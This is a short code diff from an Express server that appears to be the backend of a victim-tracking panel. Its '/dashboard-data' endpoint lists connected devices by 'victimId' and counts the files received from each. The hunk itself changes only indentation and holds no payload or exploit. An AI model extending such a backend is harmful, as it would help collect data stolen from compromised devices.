@@ -155,7 +155,7 @@ app.post('/upload', (req, res) => {
 
 // Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
-     const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
+    const dashboardData = Object.entries(connectedDevices).map(([victimId, device]) => {
         const totalFilesReceived = device.fileList.length; // Count files received
 
         return {
